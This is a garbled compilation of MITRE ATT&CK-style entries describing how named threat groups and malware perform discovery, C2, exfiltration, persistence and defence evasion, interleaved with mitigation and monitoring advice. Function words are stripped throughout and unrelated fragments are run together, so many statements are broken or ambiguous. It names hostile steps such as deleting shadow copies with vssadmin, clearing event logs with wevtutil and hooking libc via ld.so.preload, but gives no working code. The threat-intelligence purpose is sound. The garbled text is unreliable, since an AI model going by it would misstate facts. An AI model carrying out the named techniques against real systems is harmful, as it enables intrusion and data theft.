enable automatic exfiltration.(Citation: Talos PoetRAT April 2020) [Bandook](https://attack.mitre.org/software/S0234) download files system.(Citation: CheckPoint Bandook Nov 2020) [Carberp](https://attack.mitre.org/software/S0484) attempted disable security software creating suspended process security software injecting code delete antivirus core files process resumed.(Citation: Prevx Carberp March 2011) (Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer 2020)(Citation: Dark Reading APT39 JAN 2019)(Citation: Symantec Chafer February 2018) [MirageFox](https://attack.mitre.org/software/S0280) collect CPU architecture victim’s machine.(Citation: APT15 Intezer June 2018) [Rocke](https://attack.mitre.org/groups/G0106) modified /etc/ld.so.preload hook libc functions hide installed dropper mining software process lists.(Citation: Anomali Rocke March 2019)	 [InvisiMole](https://attack.mitre.org/software/S0260) enumerate windows child windows compromised host.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) Ensure permissions properly set folders sensitive private prevent unintended access. [Dyre](https://attack.mitre.org/software/S0024) command download executes additional files.(Citation: Symantec Dyre June 2015) [HermeticWizard](https://attack.mitre.org/software/S0698) named `exec_32.dll` mimic legitimate Outlook .dll.(Citation: ESET Hermetic Wizard March 2022) [Remexi](https://attack.mitre.org/software/S0375) silently executes received commands cmd.exe.(Citation: Securelist Remexi Jan 2019) [Chimera](https://attack.mitre.org/groups/G0114) <code>nltest /domain_trusts</code> identify domain trust relationships.(Citation: NCC Chimera January 2021) [APT29](https://attack.mitre.org/groups/G0016) temporarily replaced legitimate utilities own, executed payload, restored original file.(Citation: FireEye SUNBURST Backdoor December 2020) [ZeroT](https://attack.mitre.org/software/S0230) obfuscated DLLs functions dummy API calls inserted real instructions.(Citation: Proofpoint ZeroT Feb 2017) Ensure browsers plugins updated prevent exploit phase technique. modern browsers security features on. [BlackEnergy](https://attack.mitre.org/software/S0089) conducted port scans host.(Citation: Securelist BlackEnergy Nov 2014) [Duqu](https://attack.mitre.org/software/S0038) capable command control protocol port 443. However, Duqu capable encapsulating command protocol standard application layer protocols. Duqu command control protocol implements features TCP reliable transport protocol.(Citation: Symantec W32.Duqu) (Citation: RedCanary Mockingbird 2020) [Magic Hound](https://attack.mitre.org/groups/G0059) downloaded additional code files servers victims.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: DFIR Report APT35 ProxyShell March 2022) (Citation: NCC APT15 Alive Strong) [WINDSHIELD](https://attack.mitre.org/software/S0155) gather Registry values.(Citation: FireEye APT32 2017) [Milan](https://attack.mitre.org/software/S1015) encode files targeted system.(Citation: ClearSky Siamesekitten August 2021)(Citation: Kaspersky Lyceum October 2021) [Ebury](https://attack.mitre.org/software/S0377) verified C2 domain ownership decrypting TXT record embedded RSA public key.(Citation: ESET Ebury Oct 2017) Monitor abnormal process creations, Command Scripting Interpreter spawning exploited application. behavior endpoint successful compromise, abnormal behavior browser Office processes. keylogging tool [APT3](https://attack.mitre.org/groups/G0022) gathers network victim, including MAC address, IP address, WINS, DHCP server, gateway.(Citation: Symantec Buckeye)(Citation: evolution pirpi) [Bisonal](https://attack.mitre.org/software/S0268)'s dropper creates VBS scripts victim’s machine.(Citation: Unit 42 Bisonal July 2018)(Citation: Talos Bisonal Mar 2020)  (Citation: PTSecurity Cobalt Aug 2017)(Citation: PTSecurity Cobalt Dec 2016)(Citation: IB Cobalt Aug 2017) [Cannon](https://attack.mitre.org/software/S0351) exfiltrates collected data email SMTP/S POP3/S C2 channels.(Citation: Unit42 Cannon Nov 2018) [APT41](https://attack.mitre.org/groups/G0096) deployed Master Boot Record bootkits Windows systems hide malware maintain persistence victim systems.(Citation: FireEye APT41 Aug 2019) [Rocke](https://attack.mitre.org/groups/G0106) downloaded file "libprocesshider", hide files target system.(Citation: Talos Rocke August 2018)(Citation: Unit 42 Rocke January 2019) [Mosquito](https://attack.mitre.org/software/S0256)'s installer searches Registry specific antivirus tools installed system.(Citation: ESET Turla Mosquito Jan 2018) [Tonto Team](https://attack.mitre.org/groups/G0131) <code>ShowLocalGroupDetails</code> command identify administrator, user, guest accounts compromised host.(Citation: TrendMicro Tonto Team October 2020) Monitor executed commands arguments circumvent mechanisms designed control elevate privileges gain higher-level permissions. [QuasarRAT](https://attack.mitre.org/software/S0262) gather victim’s machine including OS type.(Citation: GitHub QuasarRAT) Monitor unexpected deletion virtual machine image (ex: Azure Compute Service Images DELETE) Limit usage local administrator domain administrator accounts day-to-day operations expose potential adversaries. [Penquin](https://attack.mitre.org/software/S0587) report IP compromised host attacker controlled infrastructure.(Citation: Leonardo Turla Penquin 2020) privilege protect administrative access Domain Controller Active Directory Federation Services (AD FS) server. create service accounts administrative privileges. [ObliqueRAT](https://attack.mitre.org/software/S0644) discover pluggable/removable drives extract files from.(Citation: Talos Oblique RAT March 2021) [Chaos](https://attack.mitre.org/software/S0220) reverse connection 8338/TCP, encrypted AES.(Citation: Chaos Stolen Backdoor) [NanHaiShu](https://attack.mitre.org/software/S0228) download additional files URLs.(Citation: Proofpoint Leviathan Oct 2017) [Metamorfo](https://attack.mitre.org/software/S0455) delivered victims emails malicious attachments.(Citation: FireEye Metamorfo Apr 2018)(Citation: ESET Casbaneiro Oct 2019)  [WhisperGate](https://attack.mitre.org/software/S0689) `InstallUtil.exe` process disable Windows Defender.(Citation: Unit 42 WhisperGate January 2022) [FIN7](https://attack.mitre.org/groups/G0046) PowerShell script launch shellcode retrieved additional payload.(Citation: FireEye FIN7 April 2017)(Citation: Morphisec FIN7 June 2017)(Citation: FBI Flash FIN7 USB) [SpicyOmelette](https://attack.mitre.org/software/S0646) enumerate running software targeted system.(Citation: Secureworks GOLD KINGSWOOD September 2018) infrastructure patterns malware identified, internet scanning uncover adversary staged malware accessible targeting.
Much activity visibility target organization, detection behavior difficult. Detection efforts focused post-compromise phases adversary lifecycle, [User Execution](https://attack.mitre.org/techniques/T1204) [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) . [Darkhotel](https://attack.mitre.org/groups/G0012) malware collect list running processes system.(Citation: Securelist Darkhotel Aug 2015) [CostaBricks](https://attack.mitre.org/software/S0614) load [SombRAT](https://attack.mitre.org/software/S0615) compromised host.(Citation: BlackBerry CostaRicto November 2020) Follow practices network firewall configurations ports traffic enter exit network.(Citation: TechNet Firewall Design) [HEXANE](https://attack.mitre.org/groups/G1001) tools including [BITSAdmin](https://attack.mitre.org/software/S0190) internet connectivity compromised hosts.(Citation: Kaspersky Lyceum October 2021) Ensure strong password (ideally 25+ characters) complexity service accounts passwords periodically expire.(Citation: AdSecurity Cracking Kerberos Dec 2015) Managed Service Accounts party product password vaulting.(Citation: AdSecurity Cracking Kerberos Dec 2015) [Carbon](https://attack.mitre.org/software/S0335) creates base directory files folders collected.(Citation: ESET Carbon Mar 2017) [T9000](https://attack.mitre.org/software/S0098) gathers beacons operating build CPU Architecture (32-bit/64-bit) installation.(Citation: Palo Alto T9000 Feb 2016) [Kimsuky](https://attack.mitre.org/groups/G0094) collected victim employee information.(Citation: KISA Operation Muzabi) [LitePower](https://attack.mitre.org/software/S0680) PowerShell script execute commands.(Citation: Kaspersky WIRTE November 2021) [njRAT](https://attack.mitre.org/software/S0385) ShellExecute() function script.(Citation: Trend Micro njRAT 2018) [Felismus](https://attack.mitre.org/software/S0171) C2.(Citation: Forcepoint Felismus Mar 2017) [Pupy](https://attack.mitre.org/software/S0192) Lazagne harvesting credentials.(Citation: GitHub Pupy) removing local Administrators list allowed log RDP. [APT29](https://attack.mitre.org/groups/G0016) gained initial network access victims trojanized update SolarWinds Orion software.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Cybersecurity Advisory SVR TTP 2021)(Citation: Secureworks IRON RITUAL Profile)(Citation: MSTIC Nobelium Oct 2021) [RDAT](https://attack.mitre.org/software/S0495) masqueraded VMware.exe.(Citation: Unit42 RDAT July 2020)	 [POSHSPY](https://attack.mitre.org/software/S0150) DGA derive command control URLs word list.(Citation: FireEye POSHSPY April 2017) (Citation: Dell TG-1314) [BoomBox](https://attack.mitre.org/software/S0635) POST requests C2.(Citation: MSTIC Nobelium Toolset 2021) [Machete](https://attack.mitre.org/software/S0409) collects stored credentials browsers.(Citation: ESET Machete July 2019)  Monitor unexpected files accessed removable media. [Remsec](https://attack.mitre.org/software/S0125) loader implements Security Support Provider, legitimate Windows function. [Remsec](https://attack.mitre.org/software/S0125) .exe files mimic legitimate file names Microsoft, Symantec, Kaspersky, Hewlett-Packard, VMWare. [Remsec](https://attack.mitre.org/software/S0125) disguised malicious modules filenames custom network encryption software victims.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Report) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. (Citation: FireEye APT41 Aug 2019) (Citation: MSTIC NOBELIUM Mar 2021)(Citation: Cybersecurity Advisory SVR TTP 2021)(Citation: MSTIC NOBELIUM 2021)(Citation: MSTIC Nobelium Toolset 2021)(Citation: Secureworks IRON RITUAL Profile) Limit privileges user accounts remediate Privilege Escalation vectors authorized administrators create Launch Daemons. Monitor calls <code>OpenProcess</code> manipulate lsass.exe running domain controller malicious modifications functions exported authentication-related DLLs (such cryptdll.dll samsrv.dll).(Citation: Dell Skeleton) [MegaCortex](https://attack.mitre.org/software/S0576) deleted volume shadow copies <code>vssadmin.exe</code>.(Citation: IBM MegaCortex) [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors relied victim PDF document embedded malicious link download malware.(Citation: ESET Operation Spalax Jan 2021)  [CharmPower](https://attack.mitre.org/software/S0674) exfiltrate gathered data hardcoded C2 URL POST.(Citation: Check APT35 CharmPower January 2022) Monitor executed commands arguments steal data exfiltrating symmetrically encrypted network protocol existing command control channel. [BLINDINGCAN](https://attack.mitre.org/software/S0520) obfuscated code Base64 encoding.(Citation: US-CERT BLINDINGCAN Aug 2020) [Valak](https://attack.mitre.org/software/S0476) download additional modules malware capable separate C2 channels.(Citation: Unit 42 Valak July 2020) default, administrators allowed connect remotely WMI. Restrict users allowed connect, disallow users connect remotely WMI. [Aria-body](https://attack.mitre.org/software/S0456) ability execute process <code>runas</code>.(Citation: CheckPoint Naikon 2020) [Green Lambert](https://attack.mitre.org/software/S0690) `uname` identify operating name, version, processor type.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021)   [yty](https://attack.mitre.org/software/S0248) collects files extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .xlsm, .csv, .odt, .pps, .vcf sends C2 server.(Citation: ASERT Donot March 2018) Monitor newly executed processes removable media mounted  [APT28](https://attack.mitre.org/groups/G0007) tools screenshots victims.(Citation: ESET Sednit 2)(Citation: XAgentOSX 2017)(Citation: DOJ GRU Indictment Jul 2018)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [Duqu](https://attack.mitre.org/software/S0038) custom command control protocol communicates commonly ports, frequently encapsulated application layer protocols.(Citation: Symantec W32.Duqu) [RedLeaves](https://attack.mitre.org/software/S0153) capture screenshots.(Citation: FireEye APT10 April 2017)(Citation: Accenture Hogfish April 2018) Apply patch KB2871997 Windows 7 systems limit default access accounts local administrator group.  [P.A.S. Webshell](https://attack.mitre.org/software/S0598) issue commands POST.(Citation: ANSSI Sandworm January 2021) [GreyEnergy](https://attack.mitre.org/software/S0342) HTTPS C2 communications.(Citation: ESET GreyEnergy Oct 2018) Limit access root account prevent users loading kernel modules extensions proper privilege separation limiting Privilege Escalation opportunities. [APT37](https://attack.mitre.org/groups/G0067) signed malware invalid digital certificates listed “Tencent Technology (Shenzhen) Company Limited.”(Citation: Securelist ScarCruft Jun 2016) [Octopus](https://attack.mitre.org/software/S0340) encoded C2 communications Base64.(Citation: Securelist Octopus Oct 2018) [OilRig](https://attack.mitre.org/groups/G0049) <code>sc query</code> victim gather services.(Citation: Palo Alto OilRig 2016) [Octopus](https://attack.mitre.org/software/S0340) uploaded stolen files data victim's machine C2 channel.(Citation: Securelist Octopus Oct 2018) [Smoke Loader](https://attack.mitre.org/software/S0226) scans processes perform anti-VM checks. (Citation: Talos Smoke Loader July 2018)  [The White Company](https://attack.mitre.org/groups/G0089) advantage vulnerability Word (CVE 2012-0158) execute code.(Citation: Cylance Shaheen Nov 2018) [Olympic Destroyer](https://attack.mitre.org/software/S0365) shut compromised modifying configuration settings.(Citation: Talos Olympic Destroyer 2018)(Citation: District Court Indictment GRU Unit 74455 October 2020) Leverage directory synchronization (DirSync) monitor directory replication cookies.(Citation: DirSync) (Citation: ADDSecurity DCShadow Feb 2018) monitoring alerting replication objects (Audit Detailed Directory Service Replication Events 4928 4929). (Citation: DCShadow Blog) [POWRUNER](https://attack.mitre.org/software/S0184) DNS C2 communications.(Citation: FireEye APT34 Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017) (Citation: Palo Alto OilRig 2016)(Citation: FireEye APT34 Dec 2017) [GrimAgent](https://attack.mitre.org/software/S0632) ability download execute additional payloads.(Citation: IB GrimAgent July 2021) Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [SILENTTRINITY](https://attack.mitre.org/software/S0692) screenshot current desktop.(Citation: GitHub SILENTTRINITY Modules July 2019) [SMOKEDHAM](https://attack.mitre.org/software/S0649) Google Drive Dropbox host files downloaded victims malicious links.(Citation: FireEye Shining Light DARKSIDE 2021) [Valak](https://attack.mitre.org/software/S0476) communicate multiple C2 hosts.(Citation: Unit 42 Valak July 2020) [Earth Lusca](https://attack.mitre.org/groups/G1006) [Mimikatz](https://attack.mitre.org/software/S0002) exploit domain controller ZeroLogon exploit (CVE-2020-1472).(Citation: TrendMicro EarthLusca 2022) [GreyEnergy](https://attack.mitre.org/software/S0342) digitally signs malware code-signing certificate.(Citation: ESET GreyEnergy Oct 2018) [Elise](https://attack.mitre.org/software/S0081) enumerates processes <code>tasklist</code> command.(Citation: Accenture Dragonfish Jan 2018) [S-Type](https://attack.mitre.org/software/S0085) uploaded data files compromised host C2 servers.(Citation: Cylance Dust Storm) [Gamaredon Group](https://attack.mitre.org/groups/G0047) registered domains stage payloads.(Citation: Actinium February 2022)(Citation: Unit 42 Gamaredon February 2022) [HOPLIGHT](https://attack.mitre.org/software/S0376) observed loading APIs Pass Hash.(Citation: US-CERT HOPLIGHT Apr 2019)	 Monitor third-party application logging, messaging, artifacts attempt hide artifacts behaviors evade detection.  Monitor file reads acquire user credentials third-party password managers.(Citation: ise Password Manager February 2019) [Molerats](https://attack.mitre.org/groups/G0021) decompresses ZIP files victim machine.(Citation: Kaspersky MoleRATs April 2019) [Evilnum](https://attack.mitre.org/groups/G0120) PowerShell bypass UAC.(Citation: ESET EvilNum July 2020) [Crimson](https://attack.mitre.org/software/S0115) ability delete files compromised host.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)	  monitoring anomalous domain registrant domain resolution compromise domain. Efforts tailored specific domains benign registration resolution common occurrence internet. [Vasport](https://attack.mitre.org/software/S0207) copies disk creates key Registry entry establish.(Citation: Symantec Vasport 2012) [zwShell](https://attack.mitre.org/software/S0350) browse file system.(Citation: McAfee Night Dragon) [AppleSeed](https://attack.mitre.org/software/S0622) enumerate current process compromised host.(Citation: Malwarebytes Kimsuky June 2021) (Citation: Cylance Cleaver) [LazyScripter](https://attack.mitre.org/groups/G0140) lured users malicious email attachments.(Citation: MalwareBytes LazyScripter Feb 2021) [APT19](https://attack.mitre.org/groups/G0073) Port 22 malware variant registers service.(Citation: Unit 42 C0d0so0 Jan 2016) [CORALDECK](https://attack.mitre.org/software/S0212) exfiltrated data POST headers.(Citation: FireEye APT37 Feb 2018) [IcedID](https://attack.mitre.org/software/S0483) created scheduled task executes hour establish persistence.(Citation: Juniper IcedID June 2020) Monitor third-party application logging, messaging, artifacts exploit software vulnerabilities application crash deny availability users. (Citation: Sucuri BIND9 August 2015) Attacks targeting applications generate logs server, application server, database server identify type attack. Externally monitor availability services targeted Endpoint DoS. [Higaisa](https://attack.mitre.org/groups/G0126) discovered proxy settings available.(Citation: Zscaler Higaisa 2020) [Rocke](https://attack.mitre.org/groups/G0106) installed cron job downloaded executed files C2.(Citation: Talos Rocke August 2018)(Citation: Unit 42 Rocke January 2019)(Citation: Anomali Rocke March 2019) Limit permissions users user create tokens. setting defined local account only. GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create token object. (Citation: Create Token) define create process level token local network service GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace process level token.(Citation: Replace Process Token)

Administrators log standard user tools administrator privileges built-in access token manipulation command <code>runas</code>.(Citation: runas) [Kasidet](https://attack.mitre.org/software/S0088) ability victim's operating version.(Citation: Zscaler Kasidet) [Kimsuky](https://attack.mitre.org/groups/G0094) `rundll32.exe` execute malicious scripts malware victim's network.(Citation: Talos Kimsuky Nov 2021) [VERMIN](https://attack.mitre.org/software/S0257) WMI check anti-virus software installed system.(Citation: Unit 42 VERMIN Jan 2018) [Aria-body](https://attack.mitre.org/software/S0456) C2 communications.(Citation: CheckPoint Naikon 2020) [PROMETHIUM](https://attack.mitre.org/groups/G0056) attempted users execute compromised installation files legitimate software including compression applications, security software, browsers, file recovery applications, tools utilities.(Citation: Talos Promethium June 2020)(Citation: Bitdefender StrongPity June 2020) [Chaos](https://attack.mitre.org/software/S0220) conducts brute force attacks SSH services gain initial access.(Citation: Chaos Stolen Backdoor) [zwShell](https://attack.mitre.org/software/S0350) deleted creating service deleted temporary file reboots.(Citation: McAfee Night Dragon) [Valak](https://attack.mitre.org/software/S0476) determine compromised host security products installed.(Citation: Cybereason Valak 2020) [Helminth](https://attack.mitre.org/software/S0170) C2.(Citation: Palo Alto OilRig 2016) Monitor newly constructed logon behavior breach leverage organizations access intended victims. (Citation: FireEye FIN7 April 2017)(Citation: FireEye FIN7 Aug 2018) [KeyBoy](https://attack.mitre.org/software/S0387) Python scripts installing files performing execution.(Citation: CitizenLab KeyBoy Nov 2016) Restrict permissions sensitive files <code>/proc/[pid]/maps</code> <code>/proc/[pid]/mem</code>.  [RDAT](https://attack.mitre.org/software/S0495) screenshot infected system.(Citation: Unit42 RDAT July 2020)	 [TA505](https://attack.mitre.org/groups/G0092) lures users enable content malicious attachments execute malicious files contained archives. example, [TA505](https://attack.mitre.org/groups/G0092) malware legitimate Word documents, .pdf .lnk files. (Citation: Proofpoint TA505 Sep 2017)(Citation: Proofpoint TA505 June 2018)(Citation: Proofpoint TA505 Jan 2019)(Citation: Cybereason TA505 April 2019)(Citation: ProofPoint SettingContent-ms July 2018)(Citation: Proofpoint TA505 Mar 2018)(Citation: Trend Micro TA505 June 2019)(Citation: Proofpoint TA505 October 2019)(Citation: IBM TA505 April 2020) [ZxShell](https://attack.mitre.org/software/S0412) command file manager explorer system.(Citation: Talos ZxShell Oct 2014)  [REvil](https://attack.mitre.org/software/S0496) obfuscated VBA macros execution.(Citation: Data Sodinokibi June 2019)(Citation: Picus Sodinokibi January 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors [Wevtutil](https://attack.mitre.org/software/S0645) delete security event logs `wevtutil system` `wevtutil security`.(Citation: FoxIT Wocao December 2019) [KONNI](https://attack.mitre.org/software/S0356) heavily obfuscated includes encrypted configuration files.(Citation: Malwarebytes Konni Aug 2021) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Astaroth](https://attack.mitre.org/software/S0373) loaded regsvr32.exe.(Citation: Cybereason Astaroth Feb 2019) [Drovorub](https://attack.mitre.org/software/S0502) execute arbitrary commands root compromised system.(Citation: NSA/FBI Drovorub August 2020) [Agent Tesla](https://attack.mitre.org/software/S0331) access victim’s webcam record video.(Citation: DigiTrust Agent Tesla Jan 2017)(Citation: Talos Agent Tesla Oct 2018) [Ke3chang](https://attack.mitre.org/groups/G0004) transferred compressed encrypted RAR files exfiltration established backdoor command control channel operations.(Citation: Mandiant Operation Ke3chang November 2014) [Pupy](https://attack.mitre.org/software/S0192) record sound microphone.(Citation: GitHub Pupy) Prevent adversary access privileged accounts access perform technique. [Skidmap](https://attack.mitre.org/software/S0468) ability check <code>/usr/sbin/setenforce</code> exists. file controls mode SELinux in.(Citation: Trend Micro Skidmap)  [Bisonal](https://attack.mitre.org/software/S0268) decoded strings malware XOR RC4.(Citation: Unit 42 Bisonal July 2018)(Citation: Talos Bisonal Mar 2020)  [Chimera](https://attack.mitre.org/groups/G0114) gzip Linux OS modified RAR software archive data Windows hosts.(Citation: Cycraft Chimera April 2020)(Citation: NCC Chimera January 2021) [Doki](https://attack.mitre.org/software/S0600) script gathers hardcoded list IP addresses uploads Ngrok URL.(Citation: Intezer Doki July 20) [APT29](https://attack.mitre.org/groups/G0016) <code>scheduler</code> <code>schtasks</code> create tasks remote hosts lateral movement.(Citation: Volexity SolarWinds) manipulated scheduled tasks updating existing legitimate task execute tools returned scheduled task original configuration.(Citation: FireEye SUNBURST Backdoor December 2020) [APT29](https://attack.mitre.org/groups/G0016) created scheduled task maintain [SUNSPOT](https://attack.mitre.org/software/S0562) persistence host booted 2020 SolarWinds intrusion.(Citation: CrowdStrike SUNSPOT Implant January 2021) named hijacked scheduled tasks establish persistence.(Citation: Mandiant Easy Breach) Monitor file access removable media attempt exfiltrate data physical medium, removable drive. [RunningRAT](https://attack.mitre.org/software/S0253) batch file kill security program task attempts remove itself.(Citation: McAfee Gold Dragon) [Pupy](https://attack.mitre.org/software/S0192) migrate process reflective DLL injection.(Citation: GitHub Pupy) [MuddyWater](https://attack.mitre.org/groups/G0069) VBScript files execute [POWERSTATS](https://attack.mitre.org/software/S0223) payload, macros.(Citation: FireEye MuddyWater Mar 2018)(Citation: MuddyWater TrendMicro June 2018)(Citation: Securelist MuddyWater Oct 2018)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)(Citation: ClearSky MuddyWater June 2019)(Citation: Reaqta MuddyWater November 2017)(Citation: Trend Micro Muddy Water March 2021)(Citation: Talos MuddyWater Jan 2022) (Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [Threat Group-3390](https://attack.mitre.org/groups/G0027) modified version ASPXSpy called ASPXTool.(Citation: Dell TG-3390)(Citation: Profero APT27 December 2020) [NETWIRE](https://attack.mitre.org/software/S0198) custom obfuscation algorithm hide strings including Registry keys, APIs, DLL names.(Citation: FireEye NETWIRE March 2019) [QuasarRAT](https://attack.mitre.org/software/S0262) download files victim’s machine execute them.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018) [ObliqueRAT](https://attack.mitre.org/software/S0644) gain persistence creating shortcut infected user's Startup directory.(Citation: Talos Oblique RAT March 2021) [DropBook](https://attack.mitre.org/software/S0547) collect names files folders Program Files directories.(Citation: Cybereason Molerats Dec 2020)(Citation: BleepingComputer Molerats Dec 2020)  [H1N1](https://attack.mitre.org/software/S0132) kills disables services cmd.exe.(Citation: Cisco H1N1 2) [S-Type](https://attack.mitre.org/software/S0085) download additional files compromised host.(Citation: Cylance Dust Storm) [ZeroT](https://attack.mitre.org/software/S0230) DLL side-loading load malicious payloads.(Citation: Proofpoint TA459 April 2017)(Citation: Proofpoint ZeroT Feb 2017) [JHUHUGIT](https://attack.mitre.org/software/S0044) variants communicated C2 servers HTTPS.(Citation: ESET Sednit 1)(Citation: Unit 42 Sofacy Feb 2018)(Citation: Unit 42 Playbook Dec 2017) [PowerLess](https://attack.mitre.org/software/S1012) .NET browser stealer module.(Citation: Cybereason PowerLess February 2022) Monitor network traffic originating unknown/unexpected hardware devices. Local network traffic metadata (such source MAC addressing) usage network management protocols DHCP helpful identifying hardware. Monitor DLL/PE file events, creation binary files loading DLLs processes. DLLs recognized loaded process. [Crimson](https://attack.mitre.org/software/S0115) ability determine time compromised host.(Citation: Kaspersky Transparent Tribe August 2020) [Avenger](https://attack.mitre.org/software/S0473) ability [Tasklist](https://attack.mitre.org/software/S0057) identify running processes.(Citation: Trend Micro Tick November 2019) [BLINDINGCAN](https://attack.mitre.org/software/S0520) signed code-signing certificates CodeRipper.(Citation: US-CERT BLINDINGCAN Aug 2020) [Hildegard](https://attack.mitre.org/software/S0601) modified /etc/ld.so.preload intercept shared library import functions.(Citation: Unit 42 Hildegard Malware) [Turla](https://attack.mitre.org/groups/G0010) <code>net use</code> commands connect lateral systems network.(Citation: Kaspersky Turla) Analyze process behavior determine Office application performing actions, network connections, reading files, spawning abnormal child processes (ex: [PowerShell](https://attack.mitre.org/techniques/T1059/001)), suspicious actions relate post-compromise behavior. Collect events Registry key modification Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Page) (Citation: Mandiant APT1) Monitor processes inject code processes evade process-based defenses elevate privileges. Analyze process behavior determine process performing unusual actions, network connections, reading files, suspicious actions relate post-compromise behavior.  [APT19](https://attack.mitre.org/groups/G0073) C2 communications. [APT19](https://attack.mitre.org/groups/G0073) malware variant communicate C2.(Citation: FireEye APT19)(Citation: Unit 42 C0d0so0 Jan 2016) [SombRAT](https://attack.mitre.org/software/S0615) encrypt strings XOR-based routines custom AES storage format plugins, configuration, C2 domains, harvested data.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021)(Citation: CISA AR21-126A FIVEHANDS 2021) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) collected username victim machine.(Citation: CISA MAR SLOTHFULMEDIA October 2020) (Citation: Symantec Elderwood Sept 2012) Properly configure firewalls proxies limit outgoing traffic ports proper network gateway systems. ensure hosts provisioned communicate authorized interfaces. [APT37](https://attack.mitre.org/groups/G0067) function initial dropper bypass Windows UAC execute payload privileges.(Citation: Securelist ScarCruft 2019) [Raindrop](https://attack.mitre.org/software/S0565) installed names resembled legitimate Windows file directory names.(Citation: Symantec RAINDROP January 2021)(Citation: Deep Dive Solorigate January 2021) [Emissary](https://attack.mitre.org/software/S0082) capability execute ver systeminfo commands.(Citation: Emissary Trojan Feb 2016) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors relied users enable macros malicious Word document.(Citation: DFIR Conti Bazar Nov 2021) [Metamorfo](https://attack.mitre.org/software/S0455) JavaScript time.(Citation: Medium Metamorfo Apr 2020)  [Flame](https://attack.mitre.org/software/S0143) identifies security software antivirus Security module.(Citation: Kaspersky Flame)(Citation: Kaspersky Flame Functionality) [Waterbear](https://attack.mitre.org/software/S0579) thread injection inject shellcode process security software.(Citation: Trend Micro Waterbear December 2019) (Citation: PWC Cloud Hopper Technical Annex April 2017) [APT41](https://attack.mitre.org/groups/G0096) download payloads CVE-2019-19781 CVE-2020-10189 exploits.(Citation: FireEye APT41 March 2020)  [Javali](https://attack.mitre.org/software/S0528) achieved execution victims clicking links malicious websites.(Citation: Securelist Brazilian Banking Malware July 2020) [MuddyWater](https://attack.mitre.org/groups/G0069) malware collect victim’s IP address domain name.(Citation: Securelist MuddyWater Oct 2018) [Zeus Panda](https://attack.mitre.org/software/S0330) screenshots victim’s machine.(Citation: GDATA Zeus Panda June 2017) Search SYSVOL existing GGPs credentials remove them.(Citation: ADSecurity Finding Passwords SYSVOL) [Turian](https://attack.mitre.org/software/S0647) retrieve usernames.(Citation: ESET BackdoorDiplomacy Jun 2021) Monitor newly constructed processes command-lines executed scheduled tasks outlier processes compared historical data. Data events viewed isolation, chain behavior lead activities, network connections Command Control, learning details environment Discovery, Lateral Movement. [Daserf](https://attack.mitre.org/software/S0187) custom base64 encoding obfuscate traffic.(Citation: Secureworks BRONZE BUTLER Oct 2017) [PROMETHIUM](https://attack.mitre.org/groups/G0056) created self-signed certificates sign malicious installers.(Citation: Bitdefender StrongPity June 2020) [SodaMaster](https://attack.mitre.org/software/S0627) identify username compromised host.(Citation: Securelist APT10 March 2021) [TYPEFRAME](https://attack.mitre.org/software/S0263) variant port 127 communications.(Citation: US-CERT TYPEFRAME June 2018) [Ixeshe](https://attack.mitre.org/software/S0015) achieve persistence adding <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> Registry key.(Citation: Trend Micro IXESHE 2012) [BlackOasis](https://attack.mitre.org/groups/G0063)'s stage shellcode NOP sled alternative instructions designed bypass antivirus tools.(Citation: Securelist BlackOasis Oct 2017) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [SMOKEDHAM](https://attack.mitre.org/software/S0649) <code>systeminfo</code> command compromised host.(Citation: FireEye SMOKEDHAM June 2021) [Zox](https://attack.mitre.org/software/S0672) .PNG file format C2 communications.(Citation: Novetta-Axiom) [EXOTIC LILY](https://attack.mitre.org/groups/G1011) conducted e-mail thread-hijacking campaign malicious ISO attachments.(Citation: Google EXOTIC LILY March 2022)(Citation: Proofpoint Bumblebee April 2022) [QakBot](https://attack.mitre.org/software/S0650) measure download speed targeted host.(Citation: Kaspersky QakBot September 2021) Enable pass hash mitigations apply UAC restrictions local accounts network logon. Registry key located <code>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy</code> GPO: Configuration > [Policies] > Administrative Templates > SCM: Pass Hash Mitigations: Apply UAC restrictions local accounts network logons.(Citation: GitHub IAD Secure Host Baseline UAC Filtering) [BBSRAT](https://attack.mitre.org/software/S0127) loaded DLL side-loading legitimate Citrix executable set persist Registry key location 